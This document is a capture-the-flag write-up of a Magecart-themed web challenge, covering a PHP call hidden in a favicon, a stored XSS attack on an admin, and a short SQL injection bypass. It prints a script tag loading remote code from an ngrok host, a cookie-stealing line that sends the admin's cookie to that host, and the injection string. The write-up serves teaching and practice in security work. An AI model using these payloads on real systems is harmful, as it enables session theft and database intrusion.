<h1>Level 4 -  The Magician's Den</h1>

<blockquote>
  <p>One day, the admin of Apple Story Pte Ltd received an anonymous email.</p>
  
  <p>\===&#x20;</p>
  
  <p>Dear admins of Apple Story, We are PALINDROME.&#x20;</p>
  
  <p>We have took control over your system and stolen your secret formula!&#x20;</p>
  
  <p>Do not fear for we are only after the money.&#x20;</p>
  
  <p>Pay us our demand and we will be gone.&#x20;</p>
  
  <p>For starters, we have denied all controls from you.&#x20;</p>
  
  <p>We demand a ransom of 1 BTC to be sent to 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2 by 31 Dec 2021.&#x20;</p>
  
  <p>Do not contact the police or seek for help.&#x20;</p>
  
  <p>Failure to do so and the plant is gone.&#x20;</p>
  
  <p>We planted a monitoring kit so do not test us.&#x20;</p>
  
  <p>Remember 1 BTC by 31 dec 2021 and we will be gone. Muahahahaha.</p>
  
  <p>Regards, PALINDROME</p>
  
  <p>\===</p>
  
  <p>Management have just one instruction. Retrieve the encryption key before the deadline and solve this.</p>
  
  <p>http://wp6p6avs8yncf6wuvdwnpq8lfdhyjjds.ctf.sg:14719</p>
  
  <p>Note: Payloads uploaded will be deleted every 30 minutes.</p>
</blockquote>

<h3>Finding the Target Server</h3>

<p>From the challenge name and this photo, we could gather that this challenge was inspired by Magecart!</p>

<p><img src="../../.gitbook/assets/Screenshot 2021-11-19 at 8.06.30 PM.png" alt="" /></p>

<p>We were also hinted to look into Magecart's <a href="https://www.darkreading.com/attacks-breaches/magecart-how-its-attack-techniques-evolved">past TTPs</a>. I initially thought of card skimming JavaScript, but after taking a look at the page contents, this seemed rather unlikely (the only JavaScript was for the countdown timer).</p>

<p>This bit about Favicons was quite interesting, though, so I decided to look into it.</p>

<p><img src="../../.gitbook/assets/Screenshot 2021-11-19 at 8.10.46 PM.png" alt="" /></p>

<p>It appears that the webpage's Favicon does indeed include some code!</p>

<p><img src="../../.gitbook/assets/7ca9795e30414e18b9c16b8949f02c74.png" alt="" /></p>

<p>The base64 payload decodes to</p>

<p><code>php
$ch=curl_init();
curl_setopt($ch,CURLOPT_URL,"http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/xcvlosxgbtfcofovywbxdawregjbzqta.php");
curl_setopt($ch,CURLOPT_POST,1);
curl_setopt($ch,CURLOPT_POSTFIELDS,"14c4b06b824ec593239362517f538b29=Hi%20from%20scada");
$server_output=curl_exec($ch);
</code></p>

<p>We found a new endpoint, and we know that we can send POST requests to it!</p>

<h3>Authenticating as the Admin</h3>

<p>Exploring a bit more, we can also find out the following:</p>

<ol>
<li>When POST-ing data to the server, the data is saved to a HTML file.</li>
<li><code>http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/data.php</code> lists all the recent HTML files.</li>
<li>The files are read by the admin.</li>
<li>We can perform an XSS on the admin.</li>
</ol>

<p><img src="../../.gitbook/assets/36e6f00685104e69993835240f25d59a.png" alt="" /></p>

<p>I sent the following HTML payload:</p>

<p>```html
Hi from scada</p>

<script src="https://bf25-115-66-195-39.ngrok.io/exploit.js"></script>

<p>```</p>

<p>On the exploit server, the following cookie stealing payload is hosted on <code>exploit.js</code>:</p>

<p><code>javascript
document.location.href = "https://bf25-115-66-195-39.ngrok.io/?" + document.cookie;
</code></p>

<p>This allows us to obtain the admin cookie.</p>

<h3>Getting the Flag</h3>

<p>In the <code>robots.txt</code> file, we discover some interesting entries.</p>

<p><img src="../../.gitbook/assets/dd681de414c94edb80ba81fd4bc853ac.png" alt="" /></p>

<p>The <code>login.php</code> endpoint redirects to <code>landing_admin.php</code> once we have authenticated as the admin. We also learnt that we can set <code>?debug=TRUE</code>.</p>

<p><img src="../../.gitbook/assets/5d7bf7812d0a4de5ae5258056dee66b9.png" alt="" /></p>

<p>Here, we need to exploit an SQL injection to obtain the flag. The debug parameter helps us to see SQL errors! The challenge is that the filter can only be 7 characters long, so we have to get creative.</p>

<p>I ended up with <code>filter='or'1'#</code>. Spaces were not needed between strings, the <code>'1'</code> string evaluates to a boolean True, and the <code>#</code> comments out the rest of the query to prevent errors.</p>

<p><img src="../../.gitbook/assets/cb977d0b27e74864b867b2a99f720931.png" alt="" /></p>
